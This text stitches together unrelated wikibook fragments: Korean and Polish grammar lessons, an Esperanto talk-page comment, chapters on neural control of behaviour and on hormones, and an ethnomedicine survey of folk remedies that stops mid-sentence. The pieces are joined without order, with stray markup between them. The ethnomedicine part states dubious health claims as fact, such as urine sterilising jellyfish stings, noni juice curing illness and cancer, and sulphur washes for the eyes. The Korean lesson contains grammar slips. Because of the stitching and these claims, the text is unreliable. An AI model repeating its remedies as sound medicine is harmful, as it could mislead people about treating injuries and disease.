The verb stem is taken from the verb that you see in the dictionary. In the dictionary, all verbs are written with a -다 at the end. This -다 indicates that the verb is in it's dictionary form and in order for us to use this verb, we have to conjugate it!&lt;br /&gt;
I will not go over the basics of conjugation, however, the verb always goes at the end of the sentence unless you are making quite a complex sentence that might include more than one verb.&lt;br /&gt;
&lt;br /&gt;

수연 replies and says hello back. Then she asks a question.&lt;br /&gt;
                     
                  '''&lt;big&gt;&lt;big&gt;가영씨,     내일       스키를          갈거예요?&lt;/big&gt;&lt;/big&gt;'''
&lt;big&gt;&lt;big&gt;(Ga Young)&lt;/big&gt;&lt;/big&gt; &lt;big&gt;&lt;big&gt;Tomorrow,&lt;/big&gt;&lt;/big&gt; &lt;big&gt;&lt;big&gt;Skiing(Object)&lt;/big&gt;&lt;/big&gt; &lt;big&gt;&lt;big&gt;going to go?(Future Tense)&lt;/big&gt;&lt;/big&gt;&lt;br /&gt;
&lt;br /&gt;
&lt;u&gt;'''이에요/예요'''&lt;/u&gt;&lt;br /&gt;

You can see here that the verb ending didn't have to change in order to phrase this sentence as a question! However, since this would be your first time in studying in the common level of politeness (CLP), this - 예요 that has been added at the end of the verb (go) will be new. Just like most Korean rules, you have to add either - 예요 or - 이예요 to the end of the verb. Remember 을/를? It's exactly the same! &lt;br /&gt;
# You add - 예요 if the verb ends in a vowel.&lt;br /&gt;
# You add - 이예요 if the verb ends in a consonant!&lt;br /&gt;
&lt;br /&gt;
Even though this is the rule, in normal speed conversation, this will be said fast and so the two will virtually sound the same. Don't worry though, they both have the same meaning but it's just to aide to a smooth flow of conversation.&lt;br /&gt;
&lt;br /&gt;

'''&lt;big&gt;&lt;big&gt;아니요. 저는 스키를 싫어해요.&lt;/big&gt;&lt;/big&gt;'''&lt;br /&gt;
&lt;br /&gt;
Now we can see our very first negative sentence! Here 가영 replies to 수연.&lt;br /&gt;
&lt;br /&gt;
&lt;big&gt;&lt;big&gt;No.&lt;/big&gt;&lt;/big&gt; &lt;big&gt;&lt;big&gt;I(Topic)&lt;/big&gt;&lt;/big&gt; &lt;big&gt;&lt;big&gt;skiing(Object)&lt;/big&gt;&lt;/big&gt; &lt;big&gt;&lt;big&gt;dislike.&lt;/big&gt;&lt;/big&gt;&lt;br /&gt;
&lt;br /&gt;
This is quite self explanatory with regards to the correct order. This sentence means &quot;No, I don't like skiing.&quot; However, Koreans use the word 'no' differently to that in English, this is why I have used this form of 'no' and not the other form of it which is '아니예요.'The conjugated form of &quot;to dislike&quot; into the CLP is what we can see here. So to say you dislike something, all you have to do is add  - 싫어해요 onto the end of your noun when you are speaking! It's that easy. Remember, this is only the conjugation for the common level so you can '''NOT''' use this when speaking to your elders or those in higher positions than you unless stated.&lt;br /&gt;
&lt;br /&gt;
수연 replies and there's nothing new until we see - 저도요. This literally means &quot;Me too&quot;. Great, right?&lt;br /&gt;
&lt;br /&gt;
가영 wants to lighten the conversation and so she starts to talk about something that she likes.&lt;br /&gt;
&lt;big&gt;&lt;big&gt;하지만 저는 농구를 좋아해요.&lt;/big&gt;&lt;/big&gt;&lt;br /&gt;
&lt;br /&gt;
&lt;big&gt;&lt;big&gt;But,&lt;/big&gt;&lt;/big&gt; &lt;big&gt;&lt;big&gt;I(Topic)&lt;/big&gt;&lt;/big&gt; &lt;big&gt;&lt;big&gt;Basketball(Object)&lt;/big&gt;&lt;/big&gt; &lt;big&gt;&lt;big&gt;Like!&lt;/big&gt;&lt;/big&gt;&lt;br /&gt;
&lt;br /&gt;
Think you can translate this? Well done if you got it right! It means &quot;But, I like basketball!&quot; Now we can see how to say that we 'like' something in the CLP form! - 좋아해요&lt;br /&gt;
Now, all you have to do when you want to say that you like something is to add - 좋아해요 onto the end of your noun!&lt;br /&gt;
&lt;br /&gt;
&lt;big&gt;&lt;big&gt;저도요. 저는 학교에서 농구를 하는 것을 좋아해요.&lt;/big&gt;&lt;/big&gt;&lt;br /&gt;
Here we can see quite a complex sentence and you might have to think hard to figure what the meaning of this is!&lt;br /&gt;
&lt;big&gt;&lt;big&gt;Yes, me too.&lt;/big&gt;&lt;/big&gt; &lt;big&gt;&lt;big&gt;I(Topic)&lt;/big&gt;&lt;/big&gt; &lt;big&gt;&lt;big&gt;School(at)&lt;/big&gt;&lt;/big&gt; &lt;big&gt;&lt;big&gt;Basketball-Doing(Object)&lt;/big&gt;&lt;/big&gt; &lt;big&gt;&lt;big&gt;like.&lt;/big&gt;&lt;/big&gt;
&lt;br /&gt;
This means, &quot;Me too. I like to play basketball at school.&quot; Good. Plenty of new, helpful vocabulary for us to learn! Remember that - 에서 means 'at' here. &lt;br /&gt;&lt;br /&gt;
Also, 수연 says '농구를(Object) 하는것(Verb-&gt;Noun)' to mean 'to do(play) basketball'.&lt;br /&gt;Keep in mind. To make a verb a noun, paste '-는 것' (for present tense), '-ㄴor은 것' (for past tense), '-ㄹor을 것' (for future tense) after the verb stem ('하-').&lt;br /&gt;
Let's practice this: How we can speak &quot;Are you &lt;u&gt;going to eat an apple&lt;/u&gt;?&quot; The answer is &quot;&lt;u&gt;사과를 먹을 것&lt;/u&gt;이에요?&quot; or &quot;&lt;u&gt;사과 먹을 거&lt;/u&gt;예요?&quot;''(를/을 after noun is often skipped)''.&lt;br /&gt;먹다 is to eat, and 사과 is an apple.&lt;br /&gt;&lt;br /&gt;

Isn't it easy? Sorry. It'll be pretty difficult. This is 'quite a complex sentence' that might include more than one verb.
&lt;br /&gt;

&lt;br /&gt;
Now 가영 replies with &lt;big&gt;&lt;big&gt;맞아요. 저도 그래요.&lt;/big&gt;&lt;/big&gt;&lt;br /&gt;
This is something that you will hear quite frequently in Korean and so you should learn it here. This means &quot;Right. Me, too.&quot;
&lt;br /&gt;
&lt;br /&gt;
안녕! 공부하세요!

Let's try to make some simple sentences.

Two things you should know are that:
# verbs take different forms depending on person, number and tense
# nouns take different forms depending on number and function in the sentence, or to be more exact, grammatical case

* &quot;Basia je jabłko&quot; - Basia eats/is eating an apple.
* &quot;Basia je ciastko&quot; - Basia eats/is eating a cookie.

&quot;Basia&quot; (English ''Barb'') is the short form of the name Barbara.
&quot;Jabłko&quot; means an apple.&lt;br&gt;
&quot;Ciastko&quot; means cookie.&lt;br&gt;
&quot;je&quot; is the appropriate form of verb that means &quot;to eat&quot;.

Note: Polish does not have a word for &quot;the&quot; or &quot;a&quot;, therefore when translating from Polish you have to add these in where they would be appropriate in an English sentence, using the context or meaning of the sentence as a guide.

There are 7 cases in Polish, with the two most important being [[w:Nominative_case|nominative]] (Polish &quot;mianownik&quot;) - for subjects, and accusative (Polish &quot;biernik&quot;) - for direct objects.&lt;br&gt;
Subject in Polish can adopt two forms - logical and gramatical; grammatical subject is a noun in nominative and logical - a noun in accusative. Logical subject is used when we want to express lack or excess of something. Grammatical subject can be represented by any part of speech. For example:&lt;br&gt;

*noun (Pol. rzeczownik) – '''Dom''' stoi na wzgórzu.
*adjective (Pol. przymiotnik) – '''Chory''' wziął lekarstwo.
*numeral (pol. liczebnik) – Wybiła '''dziesiąta'''.
*verb (Pol. czasownik) -  Przyjemnie jest '''Tańczyć'''.
*pronoun (Pol. zaimek) - '''On''' czyta.
*adverb (Pol. przysłówek) – '''Jutro''' należy do nas.
*conjunctive (Pol. łącznik) – '''&quot;I&quot;''' jest spójnikiem.
*preposition (Pol. przyimek) – '''&quot;W&quot;''' jest przyimkiem.
*particle (Pol. partykuła) - '''&quot;Li&quot;''', ''&quot;że&quot;'' są partykułami.
*interjection (Pol. wykrzyknik) – '''&quot;Och&quot;''' rozległo się nagle.

While word order in Polish can be changed, the most typical is:
* Subject (in nominative) - Verb - Object (in [[w:Accusative|accusative]]).

Declension of Polish nouns is rather regular.
Nouns that end in &quot;-o&quot; have the same nominative and accusative (these are neutral),
nouns that end in &quot;-a&quot; in the nominative have &quot;-ę&quot; in the accusative (these are feminine).

Knowing that, we can create more sentences.

For example:
* &quot;Dziecko je ciastko&quot; - a child eats a cookie.
* &quot;Dziecko je czekoladę&quot; - a child eats a chocolate.

* &quot;dziecko&quot; - a child
* &quot;czekolada&quot; - a chocolate

To practise a little more, let's use &quot;widzi&quot;, which is the appropriate form of the verb &quot;to see&quot;.

* &quot;Piotr widzi Basię&quot; - Piotr sees Basia
* &quot;Basia widzi Piotra&quot; - Basia sees Piotr
* &quot;Basia widzi dziecko&quot; - Basia sees a child

I am not sure if this is the right place but the links for the first two practice exercises in the book are no longer being hosted at the site they were.  They should probably either be redirected to another suitable location or taken off.

== Ĉu vi parolas la hispanan? is ambiguous? ==

Ĉu vi parolas la hispanan = do you speak spanish
Ĉu vi parolanta la hispanan = are you speaking spanish

It's not ambiguous as far as I know. Esperanto does have a present continuous tense, this statement implies it doesn't.

-lackinglatin (not logged in at the moment, just in and out while googling something else)

&quot;Ĉu vi parolanta la hispanan&quot; means something like &quot;Speaking you Spanish (adj)?&quot; I believe you mean &quot;Ĉu vi estas parolanta/parolantas hispanon&quot;.

      <text xml:space="preserve">==Neural Control of Motor Systems==
&lt;center&gt;''I am coming more and more to the conviction that the rudiments of every human behavioral mechanism will be found far down in the evolutionary scale and also represented even in primitive activities of the nervous system'' -- Karl Lashley, 1951&lt;/center&gt;

The neural control of behavior will be most obvious in cases where the brain performs only a small amount of processing. Alternatively we can explore neural systems where functions are limited to a primary goal and which are highly optimized to achieve it. The latter is particularly true for sensory systems which encode a single stimulus parameter, or motor systems in escape behaviors. We can ask how a particular behavior is produced, with characterizing muscle activities in the behavior, exploring the neural motor centers that control them, working our way upstream in the flow of information processing, until we reach the mechanisms responsible for sensory input.
 
===Motor Systems===

=====Cone Shells - Conotoxin=====

=====Poison Arrow Frogs - Curare=====

=====Cobra Venom=====
{{Animal Behavior stub}}

===Executive control===
Complex and coordinated motor patterns can often be centrally generated without requiring sensory input. Such fictive motor patterns may often even be elicited in reduced preparations and studied in vitro. Such fictive motor patterns arise from bursts of activity in isolation, or as a consequence of circuit interactions. 

====Command Neurons====
'''Command Neurons''' are cells, when activated, are capable of producing complex behavior patterns in the absence of any meaningful external stimuli. Activation of these neurons is both necessary and sufficient. Examples include the production centers for mating song in crickets, the giant fibers in crayfish escape circuitry, or the Mauthner neurons in goldfish. The concept in which single spikes are viewed as sufficient for behavior may be somewhat dated. There is little evidence that any single neuron is able to exert control over a complex behavior and its motor programs. Neurons cannot be viewed as single identities, they are always part of larger circuits, they control as well as receive input, and their activity thus only makes sense within the context into which they are embedded.

====Central Pattern Generator====
'''Central Pattern Generators''' (CPGs) are circuits that organize repetitive motor patterns, such as those underlying feeding, locomotion or breathing. The production of rhythmic motor patterns and its control by higher-order command and modulatory interneurons can be explained by the intrinsic membrane properties and connections of these neurons. Studies concern the specific timing of activation of the component neurons, how sensory neurons alter or gate CPG output, or how motor patterns are activated, inhibited, or modified by modulatory drive (Marder et al., 2005). Reciprocal Inhibition of functional antagonists can produce alternating discharges in neurons and its associated motor output. Complex, multidimensional oscillations can emerge from multiple, overlapping mechanisms.

===Examples===

====Stomatogastric System of Crustaceans====
The crustacean '''stomatogastric nervous system''' (STNS) generates rhythmic motor patterns in the stomach and other regions of the foregut. The patterns, controlling more than 40 pairs of striated muscles, serve to grind and filter food using multiple and variable cycles. Over the past 40 years the small section of the nervous system that controls it, has been used to gain an understanding how neural circuit dynamics arise from the properties of its individual neurons and their connections. The STNS consists of a group of four linked ganglia, the paired commissural ganglia (CoGs), the unpaired esophageal ganglion (OG), and the STG (Marder &amp; Bucher, 2007). The STG consists of ∼30 motor neurons that move the muscles of the gastric mill and pyloric regions of the stomach. The CoGs and OG control STG activity via descending modulatory input. Accessible to simultaneous recordings of all relevant circuit neurons, the electrical, chemical and molecular properties of individual nerve cells and the direct and modulatory connections between them, can be studied along with the various emerging network properties.

====Crayfish Escape====
A tailflip consists of a rapid, ventral flexion of the abdomen. It is produced in response to stimulation from a potential predator and results in a backward or upward propulsion that causes the animal to escape from it. The control system for this behavior is formed by 2 pairs of giant neurons - the '''lateral giant neurons''' (LGN) and the '''medial giant neurons''' (MGN). The concept of command neurons was used to explain the causation of that behavior. The actual components of the system are:
*Bipolar sensory neurons: tuned to touch or high frequency water movements (&gt;80Hz) - sensory filtering. Sensory neurons produce chemical synapses onto non-giant interneurons, and electrical synapses to giant interneurons subthreshold stimulation triggers non-giant escape swimming, produced by a pattern generator consisting of interneuron networks
*Medial Giant Interneurons: brain to last abdominal ganglion, contraction of fast flexor muscles in all abdominal segments, direction of escape: straight back
*Lateral Giant Interneurons: segmentally repeated; input in abdominal segments, flexor contraction in anterior segments of abdomen, direction of escape: upwards giant motor neurons and fast flexor motor neurons for flexion of abdomen via giant fibers. Habituation only occurs if stimulation of sensory neurons is sufficiently intense to drive an action potential in the giant fiber system
*Non-Giant Interneurons: escape swimming
*Re-Extension of abdomen follows lateral giant tailflips within 100ms of stimulus, reflex of hair receptors and muscle receptor organs
*Excitation of extensor systems via excitatory interneurons with onset of tailflip to prepare for re-extension
*Inhibition of extensor systems via inhibitory interneurons while tailflip is happening then Inhibition of further tailflips while re-extension is happening: inhibition of sensory neurons driving giant fibers, inhibition of flexor muscles

Hi Dablur, I have seen your edit, thanks a lot for helping out with the Kapampangan wikibook.

As you have probably seen, there isn't much activity at the moment, as I have been quite busy all winter.
If you speak Kapampangan and have any other ideas on how to improve this book, please go ahead an edit, I would certainly welcome some help. 

I hope to see you editing some more.

      <text xml:space="preserve">==Hormones==

===The Glandular Systems===

The body has two types of glandular systems, the endocrine, which generally secrete hormones through the bloodstream, and the exocrene which secrete fluids to the outer surfaces of the body, such as sweating.

====Endocrine glands====

The '''Endocrine System''' combines neural and glandular mechanisms which control physiological functions/behavior via the secretion of hormones. Hormones are chemical signaling molecules which play an integral role during development (organizational effects) and day-to-day functioning (activational effects) of target tissues at critical times. Secretory cells of a particular type are often clumped together into a well defined gland (e.g. pituitary, thyroid, adrenal, testes, ovaries). Secreted at that site they distribute throughout the body via the blood stream, and cause physiological changes at any other sites.

*Steroids: derived from cholesterol
*Amines: derived from amino acids
*Peptides: short chains of amino acids via protein synthesis

'''Sex hormones''', largely steroids, are secreted from gonads and adrenal cortex. Androgens (e.g., testosterone) are usually higher in male mammals while levels of estrogens (e.g., estradiol) in female mammals exceed those in males. Circulating levels of sex hormones then provide the basic organization for gender phenotypes.

'''Neurohormone''' refers to a compound that is released into the bloodstream at specialized neurohemal release sites. It binds to receptors anywhere in the body and thereby coordinates disparate biochemical responses.They are released from glands, transported via the circulatory system and influence the activity of target organs.

Functionally hormones are categorized as '''Effector hormones''' (e.g. Vasopressin, Oxytocin) or '''Tropic hormones''', releasing factors (e.g. Gonadotropin Releasing Hormone - GnRH, Growth Hormone Releasing Hormone - GHRH). Target Organs receive hormones via blood stream, respond directly or release their own hormones in response (steroid hormones), and these hormones circulate back to turn off hormonal secretion: endocrine feed back loops. '''Compensatory hypertrophy''' results from feedback loops control levels of activity where systems are upregulated until they achieve sufficient functional effects (e.g. thyroxine and goiter). '''Activational Effects''' and '''Organizational Effects'''

=====Pituitary gland=====

====Exocrine glands====

===Sex Determination===
Hormonal influences during critical periods produce fairly permanent changes in nervous and endocrine systems. Sex-determination may be chromosomal or environmental:
*Mammals: hormonal cascade of events takes an individual down one of two paths (default is female). testes determining factor (tdf) in mammals or Sexchromosomal Abnormalities: Turner syndrome (XO monosomy), Klinefelter syndrome (XXY trisomy), XYY syndrome (&quot;supermale&quot;), Multi-X syndrome (&quot;superfemale&quot;), XX Male syndrome (SRY gene transference) XY Female syndrome (SRY gene missing)
*Birds: Males are homogametic (ZZ), females are heterogametic (ZW)
*Turtles: temperature
*Fish: social stimuli

'''internal sex organs''': Precursors for both internal sex organs are present in the embryo: the '''Mullerian system''' for the female sex; the '''Wolffian system''' for males. Controlled by the levels of circulating hormones, only one set of organs develops while the other shrinks. Secreted by the testes, '''Müllerian inhibiting hormone''' (i.e., a peptide hormone) has defeminizing effects while '''androgens''' (i.e., steroid hormones) exert a masculinizing effect. '''Gonads''': testes or ovaries, first to develop. '''External genitalia''': Androgens are essential for the development of primary sexual characteristics.

'''Androgen insensitivity syndrome''': A genetic male lacking functional androgen receptors develops testes, secretes Müllerian inhibiting substance and androgens. Internal sex organs progress onto the intended male path, but female external genitalia result from the inability to respond to androgens correctly. '''Turner’s syndrome''', with genotype XO (i.e., a single X chromosome and no Y), lacks testes and ovaries. 

'''Maternal effects''' explain influenced by effects of the mother that are not due to direct genetic inheritance. '''Positional effects''' in the mammalian uterus

===Homeostasis===
Hormonal secretion or its inhibition may bring about some rapid physiological changes in a variety of target tissues. Vasopressin. {{Animal Behavior stub}}

===Behavior===
Hormones influence sensory perception (human visual, rat odor, preference in castrated vs. intact). Hypothalamus neurons monitor the internal state (thirst, hunger) and send neurosecretory cell axons to the posterior pituitary. In females, Oxytocin, released from the posterior pituitary, triggers milk let-down in mammary glands or contraction in the uterus during child-birth. It is also associated with powerful emotional effects (affective states) in parental behavior and maternal competence. Moreover, the hypothalamus secretes releasing factors to stimulate or inhibit manufacture and secretion of hormones in anterior pituitary portal system: Prolactin, Follicle stimulating hormone (FSH), Luteinizing hormone (LH); receives, stores and releases neurohormones from hypothalamus. Sex behaviors: gonadotropin releasing hormone (GnRH) -&gt; gonadotropin -&gt; gonad maturation and gonadal steroid production -&gt; feed back to brain. '''Sex steroids''' initiate the basic female and male anatomies (i.e., organizing effects in sexual differentiation cascade) but also allow animals to later respond to activational effects. Expression of sex differences in behavior also requires that steroids activate many aspects of the phenotype during maturation. Reproductive Neuroendocrinology of Ring Doves (''Streptopelia risoria''): monogamous, sexually monomorphic, parental care from both male and female (incubate eggs, crop &quot;milk&quot;); Lordosis in female hamsters: female soliciting behavior. '''Lee-Boot effect''' - estrous cycles slow and stop in female mice housed together; '''Whitten effect''' - individuals start cycling again in synchrony if exposed to male odor; '''Vandenbergh effect''' - acceleration of onset of puberty in female rat when exposed to odor of male; '''Bruce effect''' - failure of recent pregnancy of female rat when exposed to male who is not the father.

===Arthropod Molting===
'''Hormonal Control of Arthropod Molting''': Brain: releases ecdysiotropin which stimulates release of molting hormone (MH) from Prothoracic Gland; Corpora allata: Juvenile Hormone (JH) suppresses metamorphosis; Prothoracic Gland; Corpora allata: Juvenile Hormone (JH) suppresses metamorphosis

==African Culture==
Many tribes in Africa used [[Ethnomedicine/Home_Remedies#Dancing|dance]] to cure colds and ailments.  The medicine men in the tribe would encourage dancing when someone was not acting as usual because it was believed to be an unknown ailment or spirit within them.  These spirits or ailments could be sweat out or forced out by movement.

While western medicine is much more technically and analytically based, African medicine takes a much more holistic approach.  Good health, disease, success or misfortune are not seen as random chance occurrences but rather arise as a result of the individuals actions and the balance or imbalance between the individual and the social environment.  The majority of people in Africa rely on traditional medical practitioners for healthcare, which results in a reliance on traditional medicinal plants for health. [[African society]]

==Chinese Culture==
In China, [[Ethnomedicine/Home_Remedies#Licorice root|licorice root]] is widely used in home remedies, found in one-third to one-half of all herbal remedies. It possesses properties as a demulcent and expectorant, as well as being a mucous stimulator. In addition it is used as a “guide drug” in herbal prescriptions, meaning it is taken in combination with other herbal drugs in order to enhance the effectiveness of the other ingredients of a prescription, neutralize toxins or to improve the taste.&lt;ref&gt;Foster, S. “Licorice.” 2000. Steven Foster Group. May 25, 2007. http://www.stevenfoster.com/education/monograph/licorice.html.&lt;/ref&gt;  Licorice is also used in China for treatments of hepatitis, sore throat and muscle spasms. 

[[Image:Tomatillo.jpg|right|thumb|250px|Tomatillos.]]

[[Ethnomedicine/Disease_Prevention_Practices#Acupuncture|Acupuncture]] is a traditional healing method that originated in China. An acupunturist places [[Ethnomedicine/Disease_Prevention_Practices#needles|needles]] into the skin to balance out the flow of chi which is believed to be the energy that flows through the human body. In theory, Chi runs along 14 pathways called meridains and when a patient is injured, stressed, or ill, their chi is supposedly being blocked. By placing needles in the Meridians the patients chi is thought to be put back into balance.

Acupressure uses the same meridians as acupuncture, just instead for placing a needle in the meridians, the practitioner holds the point for a period of time. Many acupunctureists tell their patients various points which they can use acupressure on while at home to relieve their symptoms.
[[Ethnomedicine/Home_Remedies#Pressure_Points]]

[[Ethnomedicine/Disease_Prevention_Practices#Ginger Root|Ginger Root]] is another root used for many remedies in Chinese and Hindu cultures.  This root is believed to do many things such as: aide digestion, restore appetite, regulate menstruation, and even stimulate sexual desire.  These are some of the long term effects the root was supposed to have.  It was also said to cure colds, liver ailments, nausea, anemia, rheumatism, piles, jaundice, tetanus, and leprosy.  This root is very useful in Chinese/Hindu culture.

[[Ethnomedicine/Disease_Prevention_Practices#Ginseng|Ginseng]] is also commonly used in traditional Chinese medicine practices. According to Chinese religion, there needs to be a balance of Yin and Yang in oneself's spiritual being, and ginseng can help to achieve that. Asian ginseng is believed to promote positive Yang energy by strengthening the immune system and improving blood circulation, keeping the body strong in preventing disease and illness. American ginseng, on the other hand, promotes negative Yin energy, calms the body, and releases the excess Yang energy. This plant in general improves the skin and keeps it looking youthful. Ginseng also acts as a good remedy to curing sore throats.

===Tai Chi===
Tai Chi is a popular martial art that is very commonly practiced for exercise. Tai Chi is most popular in China, since it originated there and is deeply connected to Traditional Chinese Medicine theory. Many people can be seen early in the morning performing Tai Chi in unison in parks or special areas made for these kind of exercises. A variety of Tai Chi exercises exist today among the more popular being the Yang, Chen and Wu styles. The movements in Tai Chi allow for the circulation of chi (or energy) throughout the body combined with a calm concentration on the movements, which often produces effects similar to seated meditation. Tai Chi does not treat a specific disease or illness, but is helpful in increasing general health (especially as preventative medicine). Tai Chi is used for maintaining balance and overall wellness as well as coordination and muscle stamina. Tai Chi practitioners usually perform it daily, however a minimum of twice weekly is recommended by the majority of teachers. Tai Chi is be performed at a slow yet graceful pace that suits the individual.

In India ethno-mediciene is followed in rural parts .It is religious activity though

===Traditional Chinese Medicine===

==Ethiopian Culture==
In Ethiopian culture,particularly in the southwestern region, the use of plants to cure injuries and illnesses is very common. An example of this is the Alysicarpus,which is used to help heal and seal cuts and lesions after it has been ground into a form of lotion and spread over the injury.

==Filipino Culture==
Located in a tropical climate, the islands of the Philippines are rich with tropical vegetation. Many Filipino home remedies derive from the use of herbs as resources. Throughout the Philippines, in all of its many islands, the use and importance of local plants is evident. Because much of the Philippines is rainforest and there are still many areas which use the rainforest as a primary resource, there are several medicinal plants that can be found in the Philippines. One such plant is [[Ethnomedicine/Home_Remedies#Alagau|Alagau]], which can ''only'' be found in the Philippines. [[Ethnomedicine/Home_Remedies#Alagau|Alagau]] serves as a means to treat several ailments, one in particular is the cough.

[http://www.filipinoherbshealingwonders.filipinovegetarianrecipe.com/herbs_pics/alagaw.jpg Picture of Alagau]

Akapulko: This shrub is named for its flower buds which grow in a column of fat yellow buds. It is found on the slopes of Mt. Banahaw in the Philippines. Leaves or sap are used to treat fungal infections such as ringworm. They contain a fungicide, chrysophanic acid. Because of its anti-fungal properties, it is a common ingredient for at home skin infection remedies in the Philippines. - The juice from crushed leaves of akapulko is used for treatment of ringworm and other fungus infections of the skin. The powdered leaves are rubbed over the affected area 2-3 times a day until the infection is removed

[[Ethnomedicine/Disease_Prevention_Practices#Akapulko]]

===Bitter Melon: Momordica charantia===
Bitter Melon helps strengthen the heart by lowering blood pressure.
Usually eaten as a whole fruit or as a tea when blood pressure is high or other heart troubles occur. Taken 2-3 times daily for as long as the heart problems are occurring. This is traditionally used in the Filipino culture as a home remedy.
[http://asl2.dyndns.org/~asl2/photos/green_acres/bitter_melon.jpg]

==Global Culture==
Love is present across the globe. Although expressions and degrees of love or affection vary immensely from culture to culture it seems there is some form of what Western cultures know as love present in all societies where standard of living allows it.
[[Ethnomedicine/Home_Remedies#Love|Love]] is not commonly thought of as a remedy but many forms of love not only ease pain or discomfort but also speed healing. Taking care of, giving plentiful affection (physical, verbal, emotional)to and support of the ill or injured can be crucial to their recovery. 

===Religious Practices===  
====Catholicism==== 
The Catholic Church teaches that through the Sacrament of [[Ethnomedicine/Disease_Prevention_Practices#Anointing_the_Sick|Anointing the Sick]] the ill can not only have their body healed, but also their soul. This practice is performed through a liturgy and can only be conferred by a priest of the Catholic Church. The sacrament is believed to have five major effects: the uniting of the sick to the passion of Christ; to strengthen the sick so that they can endure their suffering; the forgiveness of sins; the restoration of health; and the preparation for passing over into the afterlife. 


==Hawaiian Culture==
Hawaiian medicine can be complicated, because the Hawaiians mixed different plants together to create medicines for different conditions. It can be even more difficult because the Hawaiians also didn’t use measuring cups to create the mixtures, but instead they used shells or other measuring devices that were available to them. 


One plant that the Hawaiians use is called the Olena plant, which is in the Ginger family. The bulb of the Olena plant is used to cure sinus and ear infections.

Noni juice, or the Indian mulberry, is part of the coffee family. is used to heal people. The Noni fruit is taken and fermented and turned into juice. Once its juice, you can drink it and it heals you. Some even say that their cancer was cured when drinking it. The main use of the Noni juice is to cure gastric ulcers, diabetes and high blood pressure.
The Hawaiian Awa plant is part of the pepper family. The root of the Awa plant can be used to treat many minor illnesses. However, Awa should not be taken too often or in a high dosage, because side effects can include skin skaling and peeling and temporary muscle paralysis.
Another healing technique is actually urinating on yourself if you get stung by a jellyfish. Urinating on the wound sterilizes it.

http://www.hawcc.hawaii.edu/nursing/tradhaw.htm

Another plant Hawaiians use is the [[Ethnomedicine/Disease_Prevention_Practices#Kalo|kalo]], or taro leaves, which is known to be the single most important plant in Hawaiian culture. It is mainly used to cure asthma.  On the other hand, many Hawaiians use the raw sections of the plant to treat pain and swelling from different insect bites, stop bleeding, and cure indigestion.

http://www.healinglifestyles.com/articles/2004/11/hawaiian_healing_text.htm

[[Ethnomedicine/Disease_Prevention_Practices#Kava|Kava]] was once a sacred Polynesian ceremonial drink. It is believed to contain properties that enhance calming, soothing feelings. The people of Hawaii use it to treat headaches, muscle pains, and is also a way to prevent insomnia.

http://www.healinglifestyles.com/articles/2004/11/hawaiian_healing_text.htm

==Hispanic culture==
There is no specific name to this remedy. The remedy includes two tomatillos (green tomatoes) pan fried until the skin turns charcoaled green. One then slices two pieces of tomatillos and sets them on a plate. You then lye in bed with warm blankets next to you with the tomatillos set on one side. You take a slice of them and rub the hot warm tomatillo on you neck lymph nodes (whichever ones are swollen). This rubbing movement will create the hot warm juice to decrease the size of your lymph nodes. One will let the juice of the tomatillos dry on one’s neck through the night. Make sure to tuck yourself under warm blankets to keep the juices warm for them to be absorbed in your skin. One can do this three times a week or until you see effect from this remedy.  The illness that treats this would be swollen lymph nodes on one’s neck due to throat infections or infections that your body is fighting. A special consideration would be to rub the hot tomatillos on the neck for about five minutes wherever the swollen lymph nodes are located or do it every night if the lymph nodes are not getting smaller. This remedy is well known in Mexico because it is known to work most of the time but not always. So this is most common in the Mexican culture. This does not treat an infection; it just makes it go away faster because the lymph nodes are being decreased. The tomatillos would usually be used to make hot Mexican sauce.

In the Mexican culture, bee stings are very common. In that part of the world, there are many species of bees, including killer bees, which we do not have many of in the US. Some have come up with the home remedy of placing sliced [[Ethnomedicine/Home_Remedies#Potatoes|potatoes]] on the stings, in order to heal them faster.

Another Hispanic home remedy related to food is gargling [[Ethnomedicine/Home_Remedies#Cayenne_Pepper|cayenne pepper]] to aid a sore throat.  Since cayenne pepper is a local resource, making use of it is common and practical in Latin America.

A Hispanic or Latino/a home remedy for getting rid of face acne is to apply a slice of fresh lemon on your face. You &quot;transfer&quot; the acne by then rubbing the piece of lemon on your arm or leg. This is believed to transfer unwanted acne to another less visible area on your body. Like other Hispanic remedies, it may seem outrageous and unbelievable, the fact that thousands still practice this anecdote, proves it to be quite effective, with positive outcomes.[[Ethnomedicine/Home_Remedies#Cayenne_Pepper|acne fighting]]

A Hispanic home remedy for curing a [[Ethnomedicine/Ethnomedicine_by_Illness#Sty|Sty]] is to use an [[Ethnomedicine/Home_Remedies#Eye Cup|Eye Cup]] which contains a mixture of warm water and sulphur.  A sty is an infection or inflammation of the secretory glands of the eyelids. This common infection or inflammation results from blocked glands within the eyelid. When the gland is blocked, the oil produced by the gland occasionally gets backed up and forms a lump, which can be red and painful. The eye cup can be used to clean out the eye and wash out the glands. The idea is to use the cup 3-4 times daily with warm (NOT HOT) water mixed with a little bit of sulphur. Blink as many times as possible for about 45 seconds.

Many Native American tribes in the United States use herbal remedies to cure aliments. One of the herbal remedies used is the use of [[Ethnomedicine/Home_Remedies#Blackberry|blackberry]] roots and leaves to treat stomach aches. The use of natural treatments to cure every day ailments are cures that have been used for hundreds of years, and still remedies such as the blackberry syrup and tea are often used today.

==Indian Culture==
Throughout northern India, people believe that [[Ethnomedicine/Disease_Prevention_Practices#The_Tying_on_of_Strings|the tying on of strings]] provides protection from malevolent spirits and forces. Throughout India, they also use several [[Ethnomedicine/Disease_Prevention_Practices#Herbs_and_plants|herbs and plants]] to cure diseases.

Many Middle Eastern cultures and Indian culture have used [[Ethnomedicine/Home_Remedies#Ginger Tea|ginger tea]] as a way of killing or staving off colds. It helps to boost the immune system due to its spice, curries are reported to have the same germ killing properties because of this.



==Japanese Culture==
In Japanese culture, [[Ethnomedicine/Disease_Prevention_Practices#Reiki|Reiki]] is a systematic form of touch healing that originated in the country. There was a reclamation of tradition in Japan during the latter half of the twentieth century, when Tendai Buddhist monks initiated or rediscovered the health system. It has become increasingly popular in Japan and has taken up a strong following in the country. As well as being popular in Japanese culture, it has traveled to the United States, where it has found strength with other new age forms of health. Reiki is used for relaxation as well as promoting healing. Reiki deals with treating the body by universal energy. When people have low energy, they feel sickly, but when they are full of energy, they are able to obtain their very best. Another large part of Japanese ethnomedicine has its roots in Chinese culture. This is the practice called [[Ethnomedicine/Disease_Prevention_Practices#Kampo|Kampo]] (漢方) sometimes referred to as kanpo. In the most basic sense kampo is the Japanese study and practice of traditional Chinese medicine. It oftentimes includes acupuncture but is most widely known for its usage of herbs to cure and treat illnesses and afflictions. Nowadays kampo has actually been integrated into the country’s National health system patients can have their kampo treatments covered by their insurance. Currently in Japan there are 148 different kampo medicines approved by the 